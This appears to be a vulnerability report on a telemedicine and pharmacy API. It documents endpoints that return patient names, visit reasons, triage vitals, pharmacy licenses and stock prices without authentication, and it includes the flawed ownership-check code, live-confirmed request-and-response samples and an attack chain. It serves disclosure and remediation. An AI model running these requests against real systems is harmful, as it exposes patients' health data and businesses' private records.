# Unauthenticated Data Exposure — CRITICAL (Live-Confirmed)

## Vulnerability Summary

Several endpoints return sensitive data with **no authentication at all**:
patient names + appointment details, medication stock/prices, and full
pharmacy business records (licenses, certificates, PII). `JwtAuthGuard` is
not global — routes are public unless a controller opts in.

**Status:** ✅ CONFIRMED ON LIVE — 2026-08-11
**Severity:** Critical (PHI + business data leak)

---

## 1. Vulnerability Identification Process

### 1.1 Static review — guard coverage

`JwtAuthGuard` is applied per-controller (`src/main.ts` does NOT register it
globally). A controller sweep found handlers with no `@UseGuards` / `@Roles`:

| Endpoint | File:Line | Data exposed |
|---|---|---|
| `GET /api/medications/:id` | `medications.controller.ts:101` | med + pharmacy + stock + price |
| `GET /api/medications/search` | `medications.controller.ts:37` | stock & price across pharmacies |
| `GET /api/medications/registry/search` | `medications.controller.ts:45` | registry data |
| `GET /api/pharmacies` | `pharmacies.controller.ts:73` | licenses, RDB certs, rep name, userId, GPS |
| `GET /api/appointments/:id/telemedicine-room` | `appointments.controller.ts:211` (`@Public`) | patient name, reason, **triage vitals** |
| `GET /api/doctors/:id/slots` | `availability.controller.ts:9` | doctor availability |

### 1.2 Telemedicine room — the access-control flaw

`appointments.service.ts:674-730`: the ownership check is inside
`if (userId && role)`. With **no token**, `userId` is undefined and the check
is skipped entirely — the room config is returned to anyone.

```typescript
// Access control only applies when authenticated!
if (userId && role) {
  if (role === 'PATIENT') { ... } else if (role === 'DOCTOR') { ... }
}
return { roomName, doctorName, patientName, triageVitals, reason, ... };
```

### 1.3 Dynamic confirmation (no Authorization headers anywhere)

```bash
# 1) Telemedicine room (patient PII)
GET /api/appointments/e4652348-…/telemedicine-room
→ {"roomName":"EVUZE-Consultation-…","patientName":"Alice Mukamana",
   "appointmentType":"IN_PERSON","reason":"…","triageVitals":null}

# 2) Medication detail (IDOR-style)
GET /api/medications/90000000-0000-0000-0000-000000000000
→ {"name":"TRICLOFEM","quantity":150,"price":500,"pharmacy":"Kacyiru Health Pharmacy"}

# 3) Search — competitor intelligence
GET /api/medications/search?limit=3
→ AKEROL | qty=150 | RWF 2300 | Gikondo Community Pharmacy
  AKEROL | qty=150 | RWF 2300 | Kacyiru Health Pharmacy

# 4) Pharmacy listing — full business docs + PII
GET /api/pharmacies
→ [ { name, rdbCertificate, pharmacyLicense, businessRegistration,
      representativeName, userId, latitude, longitude, phone, ... } ]
```

Triage vitals (`bloodPressure`, `heartRate`, `temperature`, `weight`,
`oxygenSaturation`, `nurseNotes`) are returned whenever present — none were
recorded on the live instance yet, but the code path is identical.

---

## 2. Attack Chain

```
Anyone on the internet
  → GET /api/pharmacies           (licenses, certificates, PII)
  → GET /api/medications/search   (exact stock + pricing)
  → GET /api/appointments/:id/telemedicine-room (patient names + vitals)
  → no account, no token, no rate-limit issue (global 100/min/IP only)
```

---

## 3. Evidence (2026-08-11)

```
GET /api/pharmacies            → 200, full pharmacy records incl. certificates
GET /api/medications/:id       → 200, stock+price+pharmacy
GET /api/medications/search    → 200, exact quantities across pharmacies
GET /api/appointments/:id/telemedicine-room → 200, patientName + reason
  (all WITHOUT an Authorization header)
```

---

## 4. Files

| File | Purpose |
|---|---|
| `exploit.sh` | One-shot dump of all unauthenticated endpoints (parameterised) |
| `remediation.md` | Step-by-step remediation |
